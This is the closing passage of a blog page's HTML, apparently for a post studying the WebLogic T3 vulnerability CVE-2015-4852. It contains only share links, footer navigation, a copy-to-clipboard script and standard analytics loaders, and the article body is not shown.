  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&is_video=false&description=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WebLogic系列漏洞学习之T3：CVE-2015-4852&body=Check out this article: http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&name=WebLogic系列漏洞学习之T3：CVE-2015-4852&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&t=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2021
    R17a
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </nav>
  </div>
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <span >本站总访问量: <span id="busuanzi_value_site_pv"></span>次</span>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->


</body>
</html>
